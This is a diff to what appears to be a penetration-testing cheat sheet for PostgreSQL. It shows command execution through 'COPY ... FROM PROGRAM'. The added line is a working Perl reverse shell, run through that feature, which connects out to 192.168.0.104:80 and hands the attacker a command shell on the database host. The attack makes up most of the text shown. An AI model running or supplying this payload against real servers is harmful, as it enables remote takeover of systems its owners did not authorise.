@@ -4419,6 +4419,7 @@ postgres=# \q                        // quit
 <DATABASE>=# COPY cmd_exec FROM PROGRAM 'id';
 <DATABASE>=# SELECT * FROM cmd_exec;
 <DATABASE>=# DROP TABLE IF EXISTS cmd_exec;
+COPY cmd_exec FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
 ```
 
 correc commandos pero del usuario de la shell
